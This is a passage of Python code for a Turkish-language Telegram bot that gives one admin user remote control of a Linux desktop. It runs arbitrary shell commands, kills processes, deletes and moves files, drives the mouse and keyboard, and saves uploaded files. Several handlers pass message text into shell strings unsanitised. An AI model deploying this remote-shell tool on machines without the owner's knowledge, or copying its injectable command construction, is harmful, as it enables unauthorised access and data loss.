                    bot.reply_to(message, f"🗑️ Silindi: \`{p1}\` ({boyut_formatla(boyut)})", parse_mode="Markdown")
                elif os.path.isdir(p1):
                    shutil.rmtree(p1)
                    bot.reply_to(message, f"🗑️ Klasör silindi: \`{p1}\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Dosya/klasör bulunamadı.")

        elif cmd == "tasina":
            if p1 and p2 and os.path.exists(p1):
                shutil.move(p1, p2)
                bot.reply_to(message, f"📦 Taşındı: \`{p1}\` → \`{p2}\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`tasina [kaynak] [hedef]\`", parse_mode="Markdown")

        elif cmd == "kopyala":
            if p1 and p2 and os.path.exists(p1):
                if os.path.isfile(p1):
                    shutil.copy2(p1, p2)
                elif os.path.isdir(p1):
                    shutil.copytree(p1, p2)
                bot.reply_to(message, f"📋 Kopyalandı: \`{p1}\` → \`{p2}\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`kopyala [kaynak] [hedef]\`", parse_mode="Markdown")

        elif cmd == "arama":
            if p1:
                bot.reply_to(message, "🔍 Aranıyor...")
                cikti = shell(f"find {HOME} -iname '*{p1}*' -maxdepth 5 2>/dev/null | head -30", timeout=15)
                if cikti.strip():
                    bot.reply_to(message, f"🔍 Sonuçlar:\\n\`\`\`\\n{cikti[:4000]}\\n\`\`\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "🔍 Sonuç bulunamadı.")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`arama [dosya_adı]\`", parse_mode="Markdown")

        elif cmd == "klasor_yap":
            if p1:
                os.makedirs(p1, exist_ok=True)
                bot.reply_to(message, f"📁 Oluşturuldu: \`{os.path.abspath(p1)}\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`klasor_yap [ad]\`", parse_mode="Markdown")

        elif cmd == "bosalt":
            cop_yollari = [
                os.path.join(HOME, ".local/share/Trash"),
                os.path.join(HOME, ".Trash"),
            ]
            temizlendi = False
            for cop in cop_yollari:
                if os.path.exists(cop):
                    shutil.rmtree(cop, ignore_errors=True)
                    temizlendi = True
            bot.reply_to(message, "🗑️ Çöp kutusu temizlendi!" if temizlendi else "🗑️ Çöp kutusu zaten boş.")

        elif cmd == "boyut":
            if p1 and os.path.exists(p1):
                if os.path.isfile(p1):
                    b = os.path.getsize(p1)
                    bot.reply_to(message, f"📏 \`{p1}\`: {boyut_formatla(b)}", parse_mode="Markdown")
                elif os.path.isdir(p1):
                    bot.reply_to(message, "⏳ Hesaplanıyor...")
                    cikti = shell(f"du -sh '{p1}' 2>/dev/null")
                    bot.reply_to(message, f"📏 \`{p1}\`: {cikti}", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`boyut [dosya/klasör]\`", parse_mode="Markdown")

        # ═══════════════════════════════════════════
        # 🖥️ KONTROL VE TERMİNAL
        # ═══════════════════════════════════════════
        elif cmd == "git":
            if tam_p:
                bot.reply_to(message, "⏳ Çalıştırılıyor...")
                cikti = shell(tam_p, timeout=30)
                if cikti.strip():
                    # Uzun çıktıları parçala
                    if len(cikti) > 4000:
                        parcalar_list = [cikti[i:i+4000] for i in range(0, len(cikti), 4000)]
                        for i, parca in enumerate(parcalar_list[:5]):
                            bot.send_message(message.chat.id, f"\`\`\`\\n{parca}\\n\`\`\`", parse_mode="Markdown")
                    else:
                        bot.reply_to(message, f"🖥️ Çıktı:\\n\`\`\`\\n{cikti}\\n\`\`\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "🖥️ Komut çalıştı (çıktı yok).")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`git [terminal komutu]\`", parse_mode="Markdown")

        elif cmd == "oldur":
            if p1:
                # Önce pid ile dene, sonra isimle
                cikti = shell(f"pkill -f '{p1}' 2>&1; killall '{p1}' 2>&1")
                bot.reply_to(message, f"💀 \`{p1}\` kapatılmaya çalışıldı.\\n{cikti[:500]}", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`oldur [program_adı]\`", parse_mode="Markdown")

        elif cmd == "uygulamalar":
            procs = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    info = proc.info
                    if info['memory_percent'] is not None and info['memory_percent'] > 0.1:
                        procs.append(info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            procs.sort(key=lambda x: x.get('memory_percent', 0), reverse=True)
            cikti = "🖥️ *Aktif Süreçler (RAM sıralı):*\\n\\n"
            for p in procs[:25]:
                cpu = p.get('cpu_percent', 0) or 0
                ram = p.get('memory_percent', 0) or 0
                cikti += f"• \`{p['name'][:20]}\` PID:{p['pid']} CPU:%{cpu:.1f} RAM:%{ram:.1f}\\n"
            cikti += f"\\n📊 Toplam: {len(procs)} aktif süreç"
            bot.reply_to(message, cikti[:4000], parse_mode="Markdown")

        elif cmd == "fare":
            if pyautogui:
                if p1.isdigit() and p2.isdigit():
                    pyautogui.moveTo(int(p1), int(p2), duration=0.3)
                    bot.reply_to(message, f"🖱️ Fare taşındı: ({p1}, {p2})")
                else:
                    pos = pyautogui.position()
                    ekran = pyautogui.size()
                    bot.reply_to(message,
                        f"🖱️ Konum: ({pos.x}, {pos.y})\\n"
                        f"🖥️ Ekran: {ekran.width}x{ekran.height}\\n"
                        f"Kullanım: \`fare [x] [y]\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ pyautogui yüklenmedi. GUI komutları devre dışı.")

        elif cmd == "tikla":
            if pyautogui:
                if p1 == "sag":
                    pyautogui.rightClick()
                    bot.reply_to(message, "🖱️ Sağ tıklama yapıldı.")
                elif p1 == "cift":
                    pyautogui.doubleClick()
                    bot.reply_to(message, "🖱️ Çift tıklama yapıldı.")
                else:
                    pyautogui.click()
                    bot.reply_to(message, "🖱️ Sol tıklama yapıldı.\\n💡 \`tikla sag\` / \`tikla cift\`")
            else:
                bot.reply_to(message, "⚠️ pyautogui yüklenmedi.")

        elif cmd == "yaz":
            if tam_p:
                if pyautogui:
                    # pyautogui.typewrite Türkçe karakter desteklemez
                    # xdotool kullanmayı dene
                    if komut_var_mi("xdotool"):
                        metin = tam_p.replace("'", "'\\\\''")
                        os.system(f"xdotool type --clearmodifiers '{metin}'")
                        bot.reply_to(message, f"⌨️ Yazıldı: \`{tam_p[:200]}\`", parse_mode="Markdown")
                    else:
                        # ASCII-only fallback
                        try:
                            pyautogui.typewrite(tam_p, interval=0.02)
                            bot.reply_to(message, f"⌨️ Yazıldı (ASCII): \`{tam_p[:200]}\`", parse_mode="Markdown")
                        except Exception:
                            bot.reply_to(message, "⚠️ Türkçe karakter için xdotool gerekli:\\n\`sudo apt install xdotool\`", parse_mode="Markdown")
                else:
                    if komut_var_mi("xdotool"):
                        metin = tam_p.replace("'", "'\\\\''")
                        os.system(f"xdotool type --clearmodifiers '{metin}'")
                        bot.reply_to(message, f"⌨️ Yazıldı: \`{tam_p[:200]}\`", parse_mode="Markdown")
                    else:
                        bot.reply_to(message, "⚠️ pyautogui ve xdotool bulunamadı.")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`yaz [metin]\`", parse_mode="Markdown")

        elif cmd == "tus":
            if p1:
                if pyautogui:
                    try:
                        pyautogui.press(p1)
                        bot.reply_to(message, f"⌨️ Basıldı: \`{p1}\`", parse_mode="Markdown")
                    except Exception as e:
                        bot.reply_to(message, f"⚠️ Geçersiz tuş: {e}\\n💡 Örnekler: enter, space, tab, escape, f1-f12, up, down, left, right")
                elif komut_var_mi("xdotool"):
                    os.system(f"xdotool key {p1}")
                    bot.reply_to(message, f"⌨️ Basıldı: \`{p1}\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ pyautogui ve xdotool bulunamadı.")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`tus [enter/space/tab/escape/...]\`", parse_mode="Markdown")

        elif cmd == "uyari":
            if tam_p:
                metin = tam_p.replace('"', '\\\\"')
                if komut_var_mi("notify-send"):
                    os.system(f'notify-send "🦁 Canavar V12" "{metin}" 2>/dev/null')
                    bot.reply_to(message, f"📢 Bildirim gönderildi.")
                elif komut_var_mi("zenity"):
                    os.system(f'zenity --info --text="{metin}" 2>/dev/null &')
                    bot.reply_to(message, f"📢 Bildirim gönderildi.")
                else:
                    bot.reply_to(message, "⚠️ notify-send bulunamadı:\\n\`sudo apt install libnotify-bin\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`uyari [mesaj]\`", parse_mode="Markdown")

        elif cmd == "popup":
            if tam_p:
                metin = tam_p.replace('"', '\\\\"')
                if komut_var_mi("zenity"):
                    os.system(f'zenity --info --title="Canavar V12" --text="{metin}" 2>/dev/null &')
                elif komut_var_mi("xmessage"):
                    os.system(f'xmessage "{metin}" 2>/dev/null &')
                elif komut_var_mi("notify-send"):
                    os.system(f'notify-send "Canavar V12" "{metin}" 2>/dev/null')
                else:
                    bot.reply_to(message, "⚠️ zenity/xmessage bulunamadı.")
                    return
                bot.reply_to(message, f"💬 Popup gösterildi.")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`popup [mesaj]\`", parse_mode="Markdown")

        elif cmd == "ac":
            if p1:
                os.system(f"xdg-open '{p1}' 2>/dev/null &")
                bot.reply_to(message, f"🌐 Açılıyor: \`{p1}\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`ac [url/dosya]\`", parse_mode="Markdown")

        # ═══════════════════════════════════════════
        # 🎯 ÖZEL KOMUTLAR
        # ═══════════════════════════════════════════
        elif cmd == "ozel":
            if p1 == "ekle":
                if tam_p2:
                    ozel_parcalar = tam_p2.split(" ", 1)
                    if len(ozel_parcalar) == 2:
                        ad = ozel_parcalar[0].lower()
                        komut_str = ozel_parcalar[1]
                        ozel_komutlar[ad] = komut_str
                        cfg_yaz(ozel_komutlar)
                        bot.reply_to(message, f"✅ Eklendi:\\n\`{ad}\` → \`{komut_str}\`", parse_mode="Markdown")
                    else:
                        bot.reply_to(message, "⚠️ Kullanım: \`ozel ekle [ad] [terminal_komutu]\`\\nÖrnek: \`ozel ekle ramtemizle sudo sync && echo 3 > /proc/sys/vm/drop_caches\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ Kullanım: \`ozel ekle [ad] [terminal_komutu]\`", parse_mode="Markdown")

            elif p1 == "liste":
                if ozel_komutlar:
                    liste = "🎯 *Özel Komutlar:*\\n\\n"
                    for ad, komut_str in ozel_komutlar.items():
                        liste += f"• \`{ad}\` → \`{komut_str}\`\\n"
                    bot.reply_to(message, liste[:4000], parse_mode="Markdown")
                else:
                    bot.reply_to(message, "📭 Henüz özel komut eklenmemiş.\\n💡 \`ozel ekle [ad] [komut]\`", parse_mode="Markdown")

            elif p1 == "sil":
                if p2 and p2.lower() in ozel_komutlar:
                    del ozel_komutlar[p2.lower()]
                    cfg_yaz(ozel_komutlar)
                    bot.reply_to(message, f"🗑️ \`{p2}\` silindi.", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ Komut bulunamadı. \`ozel liste\` ile kontrol et.", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım:\\n\`ozel ekle [ad] [komut]\`\\n\`ozel liste\`\\n\`ozel sil [ad]\`", parse_mode="Markdown")

        # ═══════════════════════════════════════════
        # 🔄 ÖZEL KOMUT TETİKLEYİCİ
        # ═══════════════════════════════════════════
        elif cmd in ozel_komutlar:
            bot.reply_to(message, f"⏳ \`{cmd}\` çalıştırılıyor...", parse_mode="Markdown")
            cikti = shell(ozel_komutlar[cmd], timeout=30)
            if cikti.strip():
                bot.reply_to(message, f"🚀 \`{cmd}\` sonucu:\\n\`\`\`\\n{cikti[:4000]}\\n\`\`\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, f"🚀 \`{cmd}\` çalıştı (çıktı yok).", parse_mode="Markdown")

        # ═══════════════════════════════════════════
        # ❓ BİLİNMEYEN KOMUT
        # ═══════════════════════════════════════════
        else:
            bot.reply_to(message,
                f"❓ Bilinmeyen komut: \`{cmd}\`\\n"
                f"💡 \`yardim\` yazarak tüm komutları gör.",
                parse_mode="Markdown")

    except Exception as e:
        hata_detay = f"⚠️ Hata: \`{str(e)[:500]}\`\\n\\n📍 Komut: \`{cmd}\`"
        bot.reply_to(message, hata_detay, parse_mode="Markdown")


# --- 6. AŞAMA: DOSYA ALMA ---
@bot.message_handler(content_types=['document'], func=lambda m: m.from_user.id == MY_ID)
def dosya_kaydet(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        raw = bot.download_file(file_info.file_path)
        kayit_yolu = os.path.join(HOME, message.document.file_name)
        with open(kayit_yolu, 'wb') as f:
            f.write(raw)
        boyut = len(raw)
        bot.reply_to(message,
            f"✅ Kaydedildi!\\n"
            f"📄 Dosya: \`{message.document.file_name}\`\\n"
            f"📏 Boyut: {boyut_formatla(boyut)}\\n"
            f"📂 Konum: \`{kayit_yolu}\`",
            parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Dosya kaydetme hatası: {e}")


# --- 7. AŞAMA: BAŞLATMA (CRASH-PROOF) ---
print(f"🦁 Canavar V12 Ultimate Aktif!")
print(f"👤 Admin ID: {MY_ID}")
print(f"📂 Script: {SCRIPT_PATH}")
print(f"🐍 Python: {VENV_PYTHON}")
print(f"🏠 Home: {HOME}")
print(f"🖥️ DISPLAY: {os.environ.get('DISPLAY', 'YOK')}")
print(f"⏰ Başlangıç: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
print("=" * 50)

while True:
    try:
        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        print("\\n👋 Canavar kapatıldı.")
        break
    except Exception as e:
        print(f"⚠️ Bağlantı hatası: {e}")
        print("🔄 5 saniye sonra yeniden bağlanılıyor...")
        time.sleep(5)
`;
